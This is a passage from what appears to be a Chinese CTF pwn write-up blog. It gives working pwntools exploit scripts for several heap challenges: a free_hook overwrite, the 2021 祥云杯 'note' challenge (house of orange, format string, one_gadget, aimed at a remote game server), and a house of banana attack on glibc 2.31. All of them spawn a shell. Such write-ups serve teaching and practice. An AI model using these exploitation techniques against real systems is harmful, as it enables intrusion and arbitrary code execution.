<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<h3 id="exp-v8"><a class="header-anchor" href="#exp-v8">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;fff&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook =  libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-祥云杯-note"><a class="header-anchor" href="#2021-祥云杯-note">¶</a>[2021 祥云杯]note</h2>
<h3 id="题目分析-v2"><a class="header-anchor" href="#题目分析-v2">¶</a>题目分析</h3>
<p>具体分析见我house of orange 那篇笔记</p>
<h3 id="exp-v9"><a class="header-anchor" href="#exp-v9">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;ggg&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28009</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">content1,content2</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">  p.send(content1)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">  p.sendline(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">top_chunk = heap_addr + <span class="number">0x30</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfc1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4c28</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="PasswordBox-ProVersion"><a class="header-anchor" href="#PasswordBox-ProVersion">¶</a>PasswordBox ProVersion</h2>
<h3 id="题目分析-v3"><a class="header-anchor" href="#题目分析-v3">¶</a>题目分析</h3>
<p>功能与FreeVersion 相似，多了完整的edit和show,以及一个recover可以恢复被释放掉的堆块</p>
<p>但是题目所给的libc版本位2.31，且程序能够显式的执行exit函数，这就想到了ha1vk师傅提出的高版本glibc的利用方式，house of banana(链接：“<a href="https://www.anquanke.com/post/id/222948?display=mobile">https://www.anquanke.com/post/id/222948?display=mobile</a>”)</p>
<p>然后就是一波依葫芦画瓢</p>
<h3 id="EXP-v3"><a class="header-anchor" href="#EXP-v3">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;pwdPro&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdPro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Add&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Edit:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Recover&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x428</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#5</span></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ec010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rtl_global = libc_base + <span class="number">0x1f4000</span> + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x3D</span></span><br><span class="line">ret = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x14E</span></span><br><span class="line">pop_rdi_rbp_ret = libc_base + <span class="number">0x00000000000276e9</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1b75aa</span></span><br><span class="line">system_addr =  libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_addr = (u64(p.recv(<span class="number">8</span>))^key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(rtl_global - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>,<span class="string">b&#x27;large bin attack!!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(rtl_global+<span class="number">0x221730</span>-<span class="number">0x220060</span>+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(heap_addr + <span class="number">0x960</span>)</span><br><span class="line">payload += p64(set_context) + p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_rbp_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x10</span> + <span class="number">0x110</span>)*<span class="number">0x3</span></span><br><span class="line">payload += p64(<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x31C</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x420</span> + p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
